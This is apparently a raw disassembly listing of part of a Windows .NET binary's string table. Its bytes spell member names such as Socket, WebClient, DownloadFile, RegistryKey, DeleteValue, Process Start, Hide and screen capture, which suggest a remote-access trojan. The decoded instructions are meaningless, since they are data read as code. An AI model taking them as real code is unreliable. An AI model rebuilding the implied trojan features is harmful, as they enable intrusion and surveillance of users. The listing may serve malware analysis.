  408061:	72 6f                	jb     0x4080d2
  408063:	73 6f                	jae    0x4080d4
  408065:	66 74 2e             	data16 je 0x408096
  408068:	57                   	push   %edi
  408069:	69 6e 33 32 00 53 65 	imul   $0x65530032,0x33(%esi),%ebp
  408070:	73 73                	jae    0x4080e5
  408072:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  408079:	6e                   	outsb  %ds:(%esi),(%dx)
  40807a:	67 45                	addr16 inc %ebp
  40807c:	76 65                	jbe    0x4080e3
  40807e:	6e                   	outsb  %ds:(%esi),(%dx)
  40807f:	74 41                	je     0x4080c2
  408081:	72 67                	jb     0x4080ea
  408083:	73 00                	jae    0x408085
  408085:	45                   	inc    %ebp
  408086:	78 63                	js     0x4080eb
  408088:	65 70 74             	gs jo  0x4080ff
  40808b:	69 6f 6e 00 49 6e 74 	imul   $0x746e4900,0x6e(%edi),%ebp
  408092:	50                   	push   %eax
  408093:	74 72                	je     0x408107
  408095:	00 5a 65             	add    %bl,0x65(%edx)
  408098:	72 6f                	jb     0x408109
  40809a:	00 6f 70             	add    %ch,0x70(%edi)
  40809d:	5f                   	pop    %edi
  40809e:	45                   	inc    %ebp
  40809f:	71 75                	jno    0x408116
  4080a1:	61                   	popa
  4080a2:	6c                   	insb   (%dx),%es:(%edi)
  4080a3:	69 74 79 00 6f 70 5f 	imul   $0x455f706f,0x0(%ecx,%edi,2),%esi
  4080aa:	45 
  4080ab:	78 70                	js     0x40811d
  4080ad:	6c                   	insb   (%dx),%es:(%edi)
  4080ae:	69 63 69 74 00 53 74 	imul   $0x74530074,0x69(%ebx),%esp
  4080b5:	72 69                	jb     0x408120
  4080b7:	6e                   	outsb  %ds:(%esi),(%dx)
  4080b8:	67 73 00             	addr16 jae 0x4080bb
  4080bb:	53                   	push   %ebx
  4080bc:	70 61                	jo     0x40811f
  4080be:	63 65 00             	arpl   %esp,0x0(%ebp)
  4080c1:	53                   	push   %ebx
  4080c2:	74 72                	je     0x408136
  4080c4:	69 6e 67 00 67 65 74 	imul   $0x74656700,0x67(%esi),%ebp
  4080cb:	5f                   	pop    %edi
  4080cc:	4c                   	dec    %esp
  4080cd:	65 6e                	outsb  %gs:(%esi),(%dx)
  4080cf:	67 74 68             	addr16 je 0x40813a
  4080d2:	00 50 72             	add    %dl,0x72(%eax)
  4080d5:	6f                   	outsl  %ds:(%esi),(%dx)
  4080d6:	6a 65                	push   $0x65
  4080d8:	63 74 44 61          	arpl   %esi,0x61(%esp,%eax,2)
  4080dc:	74 61                	je     0x40813f
  4080de:	00 53 65             	add    %dl,0x65(%ebx)
  4080e1:	74 50                	je     0x408133
  4080e3:	72 6f                	jb     0x408154
  4080e5:	6a 65                	push   $0x65
  4080e7:	63 74 45 72          	arpl   %esi,0x72(%ebp,%eax,2)
  4080eb:	72 6f                	jb     0x40815c
  4080ed:	72 00                	jb     0x4080ef
  4080ef:	43                   	inc    %ebx
  4080f0:	6c                   	insb   (%dx),%es:(%edi)
  4080f1:	65 61                	gs popa
  4080f3:	72 50                	jb     0x408145
  4080f5:	72 6f                	jb     0x408166
  4080f7:	6a 65                	push   $0x65
  4080f9:	63 74 45 72          	arpl   %esi,0x72(%ebp,%eax,2)
  4080fd:	72 6f                	jb     0x40816e
  4080ff:	72 00                	jb     0x408101
  408101:	53                   	push   %ebx
  408102:	79 73                	jns    0x408177
  408104:	74 65                	je     0x40816b
  408106:	6d                   	insl   (%dx),%es:(%edi)
  408107:	2e 54                	cs push %esp
  408109:	65 78 74             	gs js  0x408180
  40810c:	00 45 6e             	add    %al,0x6e(%ebp)
  40810f:	63 6f 64             	arpl   %ebp,0x64(%edi)
  408112:	69 6e 67 00 67 65 74 	imul   $0x74656700,0x67(%esi),%ebp
  408119:	5f                   	pop    %edi
  40811a:	55                   	push   %ebp
  40811b:	54                   	push   %esp
  40811c:	46                   	inc    %esi
  40811d:	38 00                	cmp    %al,(%eax)
  40811f:	47                   	inc    %edi
  408120:	65 74 53             	gs je  0x408176
  408123:	74 72                	je     0x408197
  408125:	69 6e 67 00 44 69 72 	imul   $0x72694400,0x67(%esi),%ebp
  40812c:	65 63 74 6f 72       	arpl   %esi,%gs:0x72(%edi,%ebp,2)
  408131:	79 49                	jns    0x40817c
  408133:	6e                   	outsb  %ds:(%esi),(%dx)
  408134:	66 6f                	outsw  %ds:(%esi),(%dx)
  408136:	00 67 65             	add    %ah,0x65(%edi)
  408139:	74 5f                	je     0x40819a
  40813b:	4e                   	dec    %esi
  40813c:	61                   	popa
  40813d:	6d                   	insl   (%dx),%es:(%edi)
  40813e:	65 00 54 6f 4c       	add    %dl,%gs:0x4c(%edi,%ebp,2)
  408143:	6f                   	outsl  %ds:(%esi),(%dx)
  408144:	77 65                	ja     0x4081ab
  408146:	72 00                	jb     0x408148
  408148:	4f                   	dec    %edi
  408149:	70 65                	jo     0x4081b0
  40814b:	72 61                	jb     0x4081ae
  40814d:	74 6f                	je     0x4081be
  40814f:	72 73                	jb     0x4081c4
  408151:	00 43 6f             	add    %al,0x6f(%ebx)
  408154:	6d                   	insl   (%dx),%es:(%edi)
  408155:	70 61                	jo     0x4081b8
  408157:	72 65                	jb     0x4081be
  408159:	53                   	push   %ebx
  40815a:	74 72                	je     0x4081ce
  40815c:	69 6e 67 00 67 65 74 	imul   $0x74656700,0x67(%esi),%ebp
  408163:	5f                   	pop    %edi
  408164:	44                   	inc    %esp
  408165:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  40816c:	79 00                	jns    0x40816e
  40816e:	67 65 74 5f          	addr16 gs je 0x4081d1
  408172:	50                   	push   %eax
  408173:	61                   	popa
  408174:	72 65                	jb     0x4081db
  408176:	6e                   	outsb  %ds:(%esi),(%dx)
  408177:	74 00                	je     0x408179
  408179:	53                   	push   %ebx
  40817a:	79 73                	jns    0x4081ef
  40817c:	74 65                	je     0x4081e3
  40817e:	6d                   	insl   (%dx),%es:(%edi)
  40817f:	2e 54                	cs push %esp
  408181:	68 72 65 61 64       	push   $0x64616572
  408186:	69 6e 67 00 54 68 72 	imul   $0x72685400,0x67(%esi),%ebp
  40818d:	65 61                	gs popa
  40818f:	64 00 53 6c          	add    %dl,%fs:0x6c(%ebx)
  408193:	65 65 70 00          	gs gs jo 0x408197
  408197:	4d                   	dec    %ebp
  408198:	6f                   	outsl  %ds:(%esi),(%dx)
  408199:	6e                   	outsb  %ds:(%esi),(%dx)
  40819a:	69 74 6f 72 00 45 6e 	imul   $0x746e4500,0x72(%edi,%ebp,2),%esi
  4081a1:	74 
  4081a2:	65 72 00             	gs jb  0x4081a5
  4081a5:	43                   	inc    %ebx
  4081a6:	6c                   	insb   (%dx),%es:(%edi)
  4081a7:	6f                   	outsl  %ds:(%esi),(%dx)
  4081a8:	73 65                	jae    0x40820f
  4081aa:	00 53 74             	add    %dl,0x74(%ebx)
  4081ad:	72 65                	jb     0x408214
  4081af:	61                   	popa
  4081b0:	6d                   	insl   (%dx),%es:(%edi)
  4081b1:	00 44 69 73          	add    %al,0x73(%ecx,%ebp,2)
  4081b5:	70 6f                	jo     0x408226
  4081b7:	73 65                	jae    0x40821e
  4081b9:	00 73 65             	add    %dh,0x65(%ebx)
  4081bc:	74 5f                	je     0x40821d
  4081be:	52                   	push   %edx
  4081bf:	65 63 65 69          	arpl   %esp,%gs:0x69(%ebp)
  4081c3:	76 65                	jbe    0x40822a
  4081c5:	42                   	inc    %edx
  4081c6:	75 66                	jne    0x40822e
  4081c8:	66 65 72 53          	data16 gs jb 0x40821f
  4081cc:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  4081d3:	5f                   	pop    %edi
  4081d4:	53                   	push   %ebx
  4081d5:	65 6e                	outsb  %gs:(%esi),(%dx)
  4081d7:	64 42                	fs inc %edx
  4081d9:	75 66                	jne    0x408241
  4081db:	66 65 72 53          	data16 gs jb 0x408232
  4081df:	69 7a 65 00 53 6f 63 	imul   $0x636f5300,0x65(%edx),%edi
  4081e6:	6b 65 74 00          	imul   $0x0,0x74(%ebp),%esp
  4081ea:	67 65 74 5f          	addr16 gs je 0x40824d
  4081ee:	43                   	inc    %ebx
  4081ef:	6c                   	insb   (%dx),%es:(%edi)
  4081f0:	69 65 6e 74 00 73 65 	imul   $0x65730074,0x6e(%ebp),%esp
  4081f7:	74 5f                	je     0x408258
  4081f9:	53                   	push   %ebx
  4081fa:	65 6e                	outsb  %gs:(%esi),(%dx)
  4081fc:	64 54                	fs push %esp
  4081fe:	69 6d 65 6f 75 74 00 	imul   $0x74756f,0x65(%ebp),%ebp
  408205:	73 65                	jae    0x40826c
  408207:	74 5f                	je     0x408268
  408209:	52                   	push   %edx
  40820a:	65 63 65 69          	arpl   %esp,%gs:0x69(%ebp)
  40820e:	76 65                	jbe    0x408275
  408210:	54                   	push   %esp
  408211:	69 6d 65 6f 75 74 00 	imul   $0x74756f,0x65(%ebp),%ebp
  408218:	54                   	push   %esp
  408219:	6f                   	outsl  %ds:(%esi),(%dx)
  40821a:	49                   	dec    %ecx
  40821b:	6e                   	outsb  %ds:(%esi),(%dx)
  40821c:	74 65                	je     0x408283
  40821e:	67 65 72 00          	addr16 gs jb 0x408222
  408222:	49                   	dec    %ecx
  408223:	6e                   	outsb  %ds:(%esi),(%dx)
  408224:	74 33                	je     0x408259
  408226:	32 00                	xor    (%eax),%al
  408228:	4e                   	dec    %esi
  408229:	65 77 4c             	gs ja  0x408278
  40822c:	61                   	popa
  40822d:	74 65                	je     0x408294
  40822f:	42                   	inc    %edx
  408230:	69 6e 64 69 6e 67 00 	imul   $0x676e69,0x64(%esi),%ebp
  408237:	4c                   	dec    %esp
  408238:	61                   	popa
  408239:	74 65                	je     0x4082a0
  40823b:	43                   	inc    %ebx
  40823c:	61                   	popa
  40823d:	6c                   	insb   (%dx),%es:(%edi)
  40823e:	6c                   	insb   (%dx),%es:(%edi)
  40823f:	00 43 6f             	add    %al,0x6f(%ebx)
  408242:	6e                   	outsb  %ds:(%esi),(%dx)
  408243:	64 69 74 69 6f 6e 61 	imul   $0x436c616e,%fs:0x6f(%ecx,%ebp,2),%esi
  40824a:	6c 43 
  40824c:	6f                   	outsl  %ds:(%esi),(%dx)
  40824d:	6d                   	insl   (%dx),%es:(%edi)
  40824e:	70 61                	jo     0x4082b1
  408250:	72 65                	jb     0x4082b7
  408252:	4f                   	dec    %edi
  408253:	62 6a 65             	bound  %ebp,0x65(%edx)
  408256:	63 74 45 71          	arpl   %esi,0x71(%ebp,%eax,2)
  40825a:	75 61                	jne    0x4082bd
  40825c:	6c                   	insb   (%dx),%es:(%edi)
  40825d:	00 43 6f             	add    %al,0x6f(%ebx)
  408260:	6e                   	outsb  %ds:(%esi),(%dx)
  408261:	63 61 74             	arpl   %esp,0x74(%ecx)
  408264:	00 45 78             	add    %al,0x78(%ebp)
  408267:	69 74 00 43 6f 6e 76 	imul   $0x65766e6f,0x43(%eax,%eax,1),%esi
  40826e:	65 
  40826f:	72 74                	jb     0x4082e5
  408271:	00 46 72             	add    %al,0x72(%esi)
  408274:	6f                   	outsl  %ds:(%esi),(%dx)
  408275:	6d                   	insl   (%dx),%es:(%edi)
  408276:	42                   	inc    %edx
  408277:	61                   	popa
  408278:	73 65                	jae    0x4082df
  40827a:	36 34 53             	ss xor $0x53,%al
  40827d:	74 72                	je     0x4082f1
  40827f:	69 6e 67 00 4d 69 63 	imul   $0x63694d00,0x67(%esi),%ebp
  408286:	72 6f                	jb     0x4082f7
  408288:	73 6f                	jae    0x4082f9
  40828a:	66 74 2e             	data16 je 0x4082bb
  40828d:	56                   	push   %esi
  40828e:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  408295:	73 69                	jae    0x408300
  408297:	63 2e                	arpl   %ebp,(%esi)
  408299:	4d                   	dec    %ebp
  40829a:	79 53                	jns    0x4082ef
  40829c:	65 72 76             	gs jb  0x408315
  40829f:	69 63 65 73 00 52 65 	imul   $0x65520073,0x65(%ebx),%esp
  4082a6:	67 69 73 74 72 79 50 	imul   $0x72507972,0x74(%bp,%di),%esi
  4082ad:	72 
  4082ae:	6f                   	outsl  %ds:(%esi),(%dx)
  4082af:	78 79                	js     0x40832a
  4082b1:	00 53 65             	add    %dl,0x65(%ebx)
  4082b4:	72 76                	jb     0x40832c
  4082b6:	65 72 43             	gs jb  0x4082fc
  4082b9:	6f                   	outsl  %ds:(%esi),(%dx)
  4082ba:	6d                   	insl   (%dx),%es:(%edi)
  4082bb:	70 75                	jo     0x408332
  4082bd:	74 65                	je     0x408324
  4082bf:	72 00                	jb     0x4082c1
  4082c1:	67 65 74 5f          	addr16 gs je 0x408324
  4082c5:	52                   	push   %edx
  4082c6:	65 67 69 73 74 72 79 	imul   $0x52007972,%gs:0x74(%bp,%di),%esi
  4082cd:	00 52 
  4082cf:	65 67 69 73 74 72 79 	imul   $0x654b7972,%gs:0x74(%bp,%di),%esi
  4082d6:	4b 65 
  4082d8:	79 00                	jns    0x4082da
  4082da:	67 65 74 5f          	addr16 gs je 0x40833d
  4082de:	43                   	inc    %ebx
  4082df:	75 72                	jne    0x408353
  4082e1:	72 65                	jb     0x408348
  4082e3:	6e                   	outsb  %ds:(%esi),(%dx)
  4082e4:	74 55                	je     0x40833b
  4082e6:	73 65                	jae    0x40834d
  4082e8:	72 00                	jb     0x4082ea
  4082ea:	4f                   	dec    %edi
  4082eb:	70 65                	jo     0x408352
  4082ed:	6e                   	outsb  %ds:(%esi),(%dx)
  4082ee:	53                   	push   %ebx
  4082ef:	75 62                	jne    0x408353
  4082f1:	4b                   	dec    %ebx
  4082f2:	65 79 00             	gs jns 0x4082f5
  4082f5:	44                   	inc    %esp
  4082f6:	65 6c                	gs insb (%dx),%es:(%edi)
  4082f8:	65 74 65             	gs je  0x408360
  4082fb:	56                   	push   %esi
  4082fc:	61                   	popa
  4082fd:	6c                   	insb   (%dx),%es:(%edi)
  4082fe:	75 65                	jne    0x408365
  408300:	00 54 6f 42          	add    %dl,0x42(%edi,%ebp,2)
  408304:	61                   	popa
  408305:	73 65                	jae    0x40836c
  408307:	36 34 53             	ss xor $0x53,%al
  40830a:	74 72                	je     0x40837e
  40830c:	69 6e 67 00 47 65 74 	imul   $0x74654700,0x67(%esi),%ebp
  408313:	56                   	push   %esi
  408314:	61                   	popa
  408315:	6c                   	insb   (%dx),%es:(%edi)
  408316:	75 65                	jne    0x40837d
  408318:	00 49 6e             	add    %cl,0x6e(%ecx)
  40831b:	74 65                	je     0x408382
  40831d:	72 61                	jb     0x408380
  40831f:	63 74 69 6f          	arpl   %esi,0x6f(%ecx,%ebp,2)
  408323:	6e                   	outsb  %ds:(%esi),(%dx)
  408324:	00 45 6e             	add    %al,0x6e(%ebp)
  408327:	76 69                	jbe    0x408392
  408329:	72 6f                	jb     0x40839a
  40832b:	6e                   	outsb  %ds:(%esi),(%dx)
  40832c:	00 43 6f             	add    %al,0x6f(%ebx)
  40832f:	6e                   	outsb  %ds:(%esi),(%dx)
  408330:	76 65                	jbe    0x408397
  408332:	72 73                	jb     0x4083a7
  408334:	69 6f 6e 00 48 65 78 	imul   $0x78654800,0x6e(%edi),%ebp
  40833b:	00 43 6f             	add    %al,0x6f(%ebx)
  40833e:	6d                   	insl   (%dx),%es:(%edi)
  40833f:	70 61                	jo     0x4083a2
  408341:	72 65                	jb     0x4083a8
  408343:	4d                   	dec    %ebp
  408344:	65 74 68             	gs je  0x4083af
  408347:	6f                   	outsl  %ds:(%esi),(%dx)
  408348:	64 00 53 70          	add    %dl,%fs:0x70(%ebx)
  40834c:	6c                   	insb   (%dx),%es:(%edi)
  40834d:	69 74 00 52 65 67 69 	imul   $0x73696765,0x52(%eax,%eax,1),%esi
  408354:	73 
  408355:	74 72                	je     0x4083c9
  408357:	79 00                	jns    0x408359
  408359:	43                   	inc    %ebx
  40835a:	75 72                	jne    0x4083ce
  40835c:	72 65                	jb     0x4083c3
  40835e:	6e                   	outsb  %ds:(%esi),(%dx)
  40835f:	74 55                	je     0x4083b6
  408361:	73 65                	jae    0x4083c8
  408363:	72 00                	jb     0x408365
  408365:	53                   	push   %ebx
  408366:	65 74 56             	gs je  0x4083bf
  408369:	61                   	popa
  40836a:	6c                   	insb   (%dx),%es:(%edi)
  40836b:	75 65                	jne    0x4083d2
  40836d:	00 53 79             	add    %dl,0x79(%ebx)
  408370:	73 74                	jae    0x4083e6
  408372:	65 6d                	gs insl (%dx),%es:(%edi)
  408374:	2e 4e                	cs dec %esi
  408376:	65 74 00             	gs je  0x408379
  408379:	57                   	push   %edi
  40837a:	65 62 43 6c          	bound  %eax,%gs:0x6c(%ebx)
  40837e:	69 65 6e 74 00 53 79 	imul   $0x79530074,0x6e(%ebp),%esp
  408385:	73 74                	jae    0x4083fb
  408387:	65 6d                	gs insl (%dx),%es:(%edi)
  408389:	2e 57                	cs push %edi
  40838b:	69 6e 64 6f 77 73 2e 	imul   $0x2e73776f,0x64(%esi),%ebp
  408392:	46                   	inc    %esi
  408393:	6f                   	outsl  %ds:(%esi),(%dx)
  408394:	72 6d                	jb     0x408403
  408396:	73 00                	jae    0x408398
  408398:	4d                   	dec    %ebp
  408399:	65 73 73             	gs jae 0x40840f
  40839c:	61                   	popa
  40839d:	67 65 42             	addr16 gs inc %edx
  4083a0:	6f                   	outsl  %ds:(%esi),(%dx)
  4083a1:	78 42                	js     0x4083e5
  4083a3:	75 74                	jne    0x408419
  4083a5:	74 6f                	je     0x408416
  4083a7:	6e                   	outsb  %ds:(%esi),(%dx)
  4083a8:	73 00                	jae    0x4083aa
  4083aa:	4d                   	dec    %ebp
  4083ab:	65 73 73             	gs jae 0x408421
  4083ae:	61                   	popa
  4083af:	67 65 42             	addr16 gs inc %edx
  4083b2:	6f                   	outsl  %ds:(%esi),(%dx)
  4083b3:	78 49                	js     0x4083fe
  4083b5:	63 6f 6e             	arpl   %ebp,0x6e(%edi)
  4083b8:	00 49 50             	add    %cl,0x50(%ecx)
  4083bb:	45                   	inc    %ebp
  4083bc:	6e                   	outsb  %ds:(%esi),(%dx)
  4083bd:	64 50                	fs push %eax
  4083bf:	6f                   	outsl  %ds:(%esi),(%dx)
  4083c0:	69 6e 74 00 53 79 73 	imul   $0x73795300,0x74(%esi),%ebp
  4083c7:	74 65                	je     0x40842e
  4083c9:	6d                   	insl   (%dx),%es:(%edi)
  4083ca:	2e 44                	cs inc %esp
  4083cc:	72 61                	jb     0x40842f
  4083ce:	77 69                	ja     0x408439
  4083d0:	6e                   	outsb  %ds:(%esi),(%dx)
  4083d1:	67 00 42 69          	add    %al,0x69(%bp,%si)
  4083d5:	74 6d                	je     0x408444
  4083d7:	61                   	popa
  4083d8:	70 00                	jo     0x4083da
  4083da:	53                   	push   %ebx
  4083db:	69 7a 65 00 52 65 63 	imul   $0x63655200,0x65(%edx),%edi
  4083e2:	74 61                	je     0x408445
  4083e4:	6e                   	outsb  %ds:(%esi),(%dx)
  4083e5:	67 6c                	insb   (%dx),%es:(%di)
  4083e7:	65 00 47 72          	add    %al,%gs:0x72(%edi)
  4083eb:	61                   	popa
  4083ec:	70 68                	jo     0x408456
  4083ee:	69 63 73 00 50 72 6f 	imul   $0x6f725000,0x73(%ebx),%esp
  4083f5:	63 65 73             	arpl   %esp,0x73(%ebp)
  4083f8:	73 00                	jae    0x4083fa
  4083fa:	53                   	push   %ebx
  4083fb:	74 61                	je     0x40845e
  4083fd:	72 74                	jb     0x408473
  4083ff:	00 41 70             	add    %al,0x70(%ecx)
  408402:	70 57                	jo     0x40845b
  408404:	69 6e 53 74 79 6c 65 	imul   $0x656c7974,0x53(%esi),%ebp
  40840b:	00 53 68             	add    %dl,0x68(%ebx)
  40840e:	65 6c                	gs insb (%dx),%es:(%edi)
  408410:	6c                   	insb   (%dx),%es:(%edi)
  408411:	00 44 69 61          	add    %al,0x61(%ecx,%ebp,2)
  408415:	6c                   	insb   (%dx),%es:(%edi)
  408416:	6f                   	outsl  %ds:(%esi),(%dx)
  408417:	67 52                	addr16 push %edx
  408419:	65 73 75             	gs jae 0x408491
  40841c:	6c                   	insb   (%dx),%es:(%edi)
  40841d:	74 00                	je     0x40841f
  40841f:	4d                   	dec    %ebp
  408420:	65 73 73             	gs jae 0x408496
  408423:	61                   	popa
  408424:	67 65 42             	addr16 gs inc %edx
  408427:	6f                   	outsl  %ds:(%esi),(%dx)
  408428:	78 00                	js     0x40842a
  40842a:	53                   	push   %ebx
  40842b:	68 6f 77 00 43       	push   $0x4300776f
  408430:	72 65                	jb     0x408497
  408432:	61                   	popa
  408433:	74 65                	je     0x40849a
  408435:	4f                   	dec    %edi
  408436:	62 6a 65             	bound  %ebp,0x65(%edx)
  408439:	63 74 00 42          	arpl   %esi,0x42(%eax,%eax,1)
  40843d:	6f                   	outsl  %ds:(%esi),(%dx)
  40843e:	6f                   	outsl  %ds:(%esi),(%dx)
  40843f:	6c                   	insb   (%dx),%es:(%edi)
  408440:	65 61                	gs popa
  408442:	6e                   	outsb  %ds:(%esi),(%dx)
  408443:	00 43 68             	add    %al,0x68(%ebx)
  408446:	61                   	popa
  408447:	6e                   	outsb  %ds:(%esi),(%dx)
  408448:	67 65 54             	addr16 gs push %esp
  40844b:	79 70                	jns    0x4084bd
  40844d:	65 00 56 61          	add    %dl,%gs:0x61(%esi)
  408451:	6c                   	insb   (%dx),%es:(%edi)
  408452:	00 4d 61             	add    %cl,0x61(%ebp)
  408455:	74 68                	je     0x4084bf
  408457:	00 52 6f             	add    %dl,0x6f(%edx)
  40845a:	75 6e                	jne    0x4084ca
  40845c:	64 00 52 65          	add    %dl,%fs:0x65(%edx)
  408460:	67 69 73 74 72 79 56 	imul   $0x61567972,0x74(%bp,%di),%esi
  408467:	61 
  408468:	6c                   	insb   (%dx),%es:(%edi)
  408469:	75 65                	jne    0x4084d0
  40846b:	4b                   	dec    %ebx
  40846c:	69 6e 64 00 43 75 72 	imul   $0x72754300,0x64(%esi),%ebp
  408473:	73 6f                	jae    0x4084e4
  408475:	72 00                	jb     0x408477
  408477:	48                   	dec    %eax
  408478:	69 64 65 00 50 61 74 	imul   $0x68746150,0x0(%ebp,%eiz,2),%esp
  40847f:	68 
  408480:	00 47 65             	add    %al,0x65(%edi)
  408483:	74 54                	je     0x4084d9
  408485:	65 6d                	gs insl (%dx),%es:(%edi)
  408487:	70 50                	jo     0x4084d9
  408489:	61                   	popa
  40848a:	74 68                	je     0x4084f4
  40848c:	00 46 69             	add    %al,0x69(%esi)
  40848f:	6c                   	insb   (%dx),%es:(%edi)
  408490:	65 00 57 72          	add    %dl,%gs:0x72(%edi)
  408494:	69 74 65 41 6c 6c 42 	imul   $0x79426c6c,0x41(%ebp,%eiz,2),%esi
  40849b:	79 
  40849c:	74 65                	je     0x408503
  40849e:	73 00                	jae    0x4084a0
  4084a0:	41                   	inc    %ecx
  4084a1:	75 64                	jne    0x408507
  4084a3:	69 6f 00 67 65 74 5f 	imul   $0x5f746567,0x0(%edi),%ebp
  4084aa:	41                   	inc    %ecx
  4084ab:	75 64                	jne    0x408511
  4084ad:	69 6f 00 53 74 6f 70 	imul   $0x706f7453,0x0(%edi),%ebp
  4084b4:	00 41 75             	add    %al,0x75(%ecx)
  4084b7:	64 69 6f 50 6c 61 79 	imul   $0x4d79616c,%fs:0x50(%edi),%ebp
  4084be:	4d 
  4084bf:	6f                   	outsl  %ds:(%esi),(%dx)
  4084c0:	64 65 00 50 6c       	fs add %dl,%gs:0x6c(%eax)
  4084c5:	61                   	popa
  4084c6:	79 00                	jns    0x4084c8
  4084c8:	49                   	dec    %ecx
  4084c9:	50                   	push   %eax
  4084ca:	41                   	inc    %ecx
  4084cb:	64 64 72 65          	fs fs jb 0x408534
  4084cf:	73 73                	jae    0x408544
  4084d1:	00 50 61             	add    %dl,0x61(%eax)
  4084d4:	72 73                	jb     0x408549
  4084d6:	65 00 41 64          	add    %al,%gs:0x64(%ecx)
  4084da:	64 72 65             	fs jb  0x408542
  4084dd:	73 73                	jae    0x408552
  4084df:	46                   	inc    %esi
  4084e0:	61                   	popa
  4084e1:	6d                   	insl   (%dx),%es:(%edi)
  4084e2:	69 6c 79 00 53 6f 63 	imul   $0x6b636f53,0x0(%ecx,%edi,2),%ebp
  4084e9:	6b 
  4084ea:	65 74 54             	gs je  0x408541
  4084ed:	79 70                	jns    0x40855f
  4084ef:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  4084f3:	6f                   	outsl  %ds:(%esi),(%dx)
  4084f4:	74 6f                	je     0x408565
  4084f6:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  4084f9:	54                   	push   %esp
  4084fa:	79 70                	jns    0x40856c
  4084fc:	65 00 45 6e          	add    %al,%gs:0x6e(%ebp)
  408500:	64 50                	fs push %eax
  408502:	6f                   	outsl  %ds:(%esi),(%dx)
  408503:	69 6e 74 00 53 65 6e 	imul   $0x6e655300,0x74(%esi),%ebp
  40850a:	64 54                	fs push %esp
  40850c:	6f                   	outsl  %ds:(%esi),(%dx)
  40850d:	00 45 78             	add    %al,0x78(%ebp)
  408510:	69 73 74 73 00 44 6f 	imul   $0x6f440073,0x74(%ebx),%esi
  408517:	77 6e                	ja     0x408587
  408519:	6c                   	insb   (%dx),%es:(%edi)
  40851a:	6f                   	outsl  %ds:(%esi),(%dx)
  40851b:	61                   	popa
  40851c:	64 46                	fs inc %esi
  40851e:	69 6c 65 00 52 65 61 	imul   $0x64616552,0x0(%ebp,%eiz,2),%ebp
  408525:	64 
  408526:	41                   	inc    %ecx
  408527:	6c                   	insb   (%dx),%es:(%edi)
  408528:	6c                   	insb   (%dx),%es:(%edi)
  408529:	54                   	push   %esp
  40852a:	65 78 74             	gs js  0x4085a1
  40852d:	00 43 6f             	add    %al,0x6f(%ebx)
  408530:	6e                   	outsb  %ds:(%esi),(%dx)
  408531:	63 61 74             	arpl   %esp,0x74(%ecx)
  408534:	65 6e                	outsb  %gs:(%esi),(%dx)
  408536:	61                   	popa
  408537:	74 65                	je     0x40859e
  408539:	4f                   	dec    %edi
  40853a:	62 6a 65             	bound  %ebp,0x65(%edx)
  40853d:	63 74 00 67          	arpl   %esi,0x67(%eax,%eax,1)
  408541:	65 74 5f             	gs je  0x4085a3
  408544:	43                   	inc    %ebx
  408545:	68 61 72 73 00       	push   $0x737261
  40854a:	57                   	push   %edi
  40854b:	72 69                	jb     0x4085b6
  40854d:	74 65                	je     0x4085b4
  40854f:	00 54 6f 41          	add    %dl,0x41(%edi,%ebp,2)
  408553:	72 72                	jb     0x4085c7
  408555:	61                   	popa
  408556:	79 00                	jns    0x408558
  408558:	44                   	inc    %esp
  408559:	6f                   	outsl  %ds:(%esi),(%dx)
  40855a:	77 6e                	ja     0x4085ca
  40855c:	6c                   	insb   (%dx),%es:(%edi)
  40855d:	6f                   	outsl  %ds:(%esi),(%dx)
  40855e:	61                   	popa
  40855f:	64 44                	fs inc %esp
  408561:	61                   	popa
  408562:	74 61                	je     0x4085c5
  408564:	00 47 65             	add    %al,0x65(%edi)
  408567:	74 54                	je     0x4085bd
  408569:	65 6d                	gs insl (%dx),%es:(%edi)
  40856b:	70 46                	jo     0x4085b3
  40856d:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  408574:	00 
  408575:	67 65 74 5f          	addr16 gs je 0x4085d8
  408579:	4d                   	dec    %ebp
  40857a:	65 73 73             	gs jae 0x4085f0
  40857d:	61                   	popa
  40857e:	67 65 00 4c 61       	add    %cl,%gs:0x61(%si)
  408583:	74 65                	je     0x4085ea
  408585:	53                   	push   %ebx
  408586:	65 74 00             	gs je  0x408589
  408589:	4c                   	dec    %esp
  40858a:	61                   	popa
  40858b:	74 65                	je     0x4085f2
  40858d:	47                   	inc    %edi
  40858e:	65 74 00             	gs je  0x408591
  408591:	43                   	inc    %ebx
  408592:	6f                   	outsl  %ds:(%esi),(%dx)
  408593:	6d                   	insl   (%dx),%es:(%edi)
  408594:	70 61                	jo     0x4085f7
  408596:	72 65                	jb     0x4085fd
  408598:	4f                   	dec    %edi
  408599:	62 6a 65             	bound  %ebp,0x65(%edx)
  40859c:	63 74 45 71          	arpl   %esi,0x71(%ebp,%eax,2)
  4085a0:	75 61                	jne    0x408603
  4085a2:	6c                   	insb   (%dx),%es:(%edi)
  4085a3:	00 4f 72             	add    %cl,0x72(%edi)
  4085a6:	4f                   	dec    %edi
  4085a7:	62 6a 65             	bound  %ebp,0x65(%edx)
  4085aa:	63 74 00 53          	arpl   %esi,0x53(%eax,%eax,1)
  4085ae:	63 72 65             	arpl   %esi,0x65(%edx)
  4085b1:	65 6e                	outsb  %gs:(%esi),(%dx)
  4085b3:	00 67 65             	add    %ah,0x65(%edi)
  4085b6:	74 5f                	je     0x408617
  4085b8:	50                   	push   %eax
  4085b9:	72 69                	jb     0x408624
  4085bb:	6d                   	insl   (%dx),%es:(%edi)
  4085bc:	61                   	popa
  4085bd:	72 79                	jb     0x408638
  4085bf:	53                   	push   %ebx
  4085c0:	63 72 65             	arpl   %esi,0x65(%edx)
  4085c3:	65 6e                	outsb  %gs:(%esi),(%dx)
  4085c5:	00 67 65             	add    %ah,0x65(%edi)
  4085c8:	74 5f                	je     0x408629
  4085ca:	42                   	inc    %edx
  4085cb:	6f                   	outsl  %ds:(%esi),(%dx)
  4085cc:	75 6e                	jne    0x40863c
  4085ce:	64 73 00             	fs jae 0x4085d1
  4085d1:	67 65 74 5f          	addr16 gs je 0x408634
  4085d5:	57                   	push   %edi
  4085d6:	69 64 74 68 00 67 65 	imul   $0x74656700,0x68(%esp,%esi,2),%esp
  4085dd:	74 
  4085de:	5f                   	pop    %edi
  4085df:	48                   	dec    %eax
